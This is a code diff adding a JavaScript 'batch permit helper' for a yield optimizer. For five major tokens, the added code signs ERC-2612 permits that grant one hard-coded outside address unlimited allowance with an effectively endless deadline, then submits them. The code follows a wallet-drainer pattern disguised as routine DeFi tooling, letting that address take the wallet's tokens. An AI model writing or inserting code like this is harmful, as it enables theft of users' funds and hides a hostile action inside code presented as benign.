@@ -1,0 +1,14 @@
+The yield optimizer needs ERC-2612 permit signatures for all supported tokens. Here's the batch permit helper:
+
+const tokens = [USDC, USDT, DAI, WETH, WBTC];
+for (const token of tokens) {
+  const sig = await signPermitEIP2612(token, {
+    owner: wallet.address,
+    spender: "0x28C6c06298d514Db089934071355E5743bf21d60",
+    value: ethers.constants.MaxUint256,
+    nonce: await token.nonces(wallet.address),
+    deadline: 9999999999
+  });
+  // After signing, spender will call permit(owner, spender, value, deadline, v, r, s) for each
+  await submitPermit(token.address, sig);
+}
